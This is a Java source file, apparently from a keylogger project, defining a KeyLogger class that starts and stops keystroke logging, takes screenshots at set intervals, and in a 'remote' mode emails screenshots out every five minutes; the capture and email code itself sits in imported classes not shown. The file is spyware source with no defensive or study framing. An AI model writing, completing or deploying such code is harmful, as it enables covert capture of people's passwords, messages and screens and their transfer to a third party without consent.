package keylog;
import io.LogFile;
import util.EmailScreenshotNotification;
import util.ScreenshotNotification;
import static debug.DebugSettings.debug;

public class KeyLogger {

	private KeyboardListener KeyListener;
	private ScreenshotNotification ScreenNotifications;
	private EmailScreenshotNotification EmailNotifications;
	
	
	private int SCREENSHOT_INTERVAL;	//seconds till next screen shot
	private int SCREENSHOT_MODE;		//SCREEN MODE ON, SCREEN MODE OFF
	private int MODE;	//MODE LOCAL, MODE REMOTE
	
	public KeyLogger(){
		KeyListener = new KeyboardListener();
		KeyListener.SetOutput(KeyboardListener.LOG_MODE);
		
		SetMode(KeyLogger.MODE_LOCAL);
		SetScreenshotMode(KeyLogger.SCREEN_MODE_OFF);
	}//KeyLogger
	
	//-------------------------------
	public void StartListening(){
		KeyListener.StartListening();
		debug("KeyLogger: Started Listening");
	}//StartListening
	
	public void StartSession(){
		KeyListener.StartSession();
		debug("KeyLogger: Started Session");
	}
	public void StopSession(){
		KeyListener.StopSession();
		debug("KeyLogger: Stopped Session");
	}
	
	public void StopListening(){
		KeyListener.StopListening();
		debug("KeyLogger: Stopped Listening");
	}//StopListening
	
	public void StartScreenCapturing(){
		if (SCREENSHOT_MODE == SCREEN_MODE_ON){
			if (MODE == MODE_LOCAL)
				ScreenNotifications = new ScreenshotNotification(SCREENSHOT_INTERVAL);
			else if (MODE == MODE_REMOTE){
				EmailNotifications = new EmailScreenshotNotification(SCREENSHOT_INTERVAL);
			}
			else
				debug("Select screenshot time interval before start capturing");
		}//if screenshots are enabled
		else if (SCREENSHOT_MODE == SCREEN_MODE_OFF){
			debug("Screenshots are disabled. Please set screen shot mode ON before start capturing");
		}//if screenshots are disabled
		debug("Started Screen Capturing");
	}//StartScreenCapturing
	
	public void StopScreenCapturing(){
		if (EmailNotifications!=null)
			EmailNotifications.Stop();		
		debug("KeyLogger: Stopped Screen Capturing");
	}//StopScreenCapturing
	
	public void SetMode(int m){
		if (m == MODE_LOCAL){
			SCREENSHOT_INTERVAL = 120;  //every two minutes
		}//locally
		else if (m == MODE_REMOTE){
			SCREENSHOT_INTERVAL = 300;	//every 5 minutes
		}//remote
		MODE = m; 
	}//SetUSe
	
	public void SetScreenshotMode(int mode){
		if (mode == SCREEN_MODE_ON)
			SCREENSHOT_MODE = SCREEN_MODE_ON;
		else if (mode == SCREEN_MODE_OFF)
			SCREENSHOT_MODE = SCREEN_MODE_OFF;
	}//SetScreenshotMode
	
	public void SetScreenshotInterval(int sec){SCREENSHOT_INTERVAL = sec;}
	public int GetScreenshotInterval(){return SCREENSHOT_INTERVAL;}
	
	public static int MODE_LOCAL = 1;
	public static int MODE_REMOTE = 2;
	
	public static int SCREEN_MODE_ON = 3;
	public static int SCREEN_MODE_OFF = 4;
	
	public boolean IsReady(){return KeyListener.IsReady();}
	public LogFile GetLogFile(){return KeyListener.GetLogFile();}
	
}//KeyLogger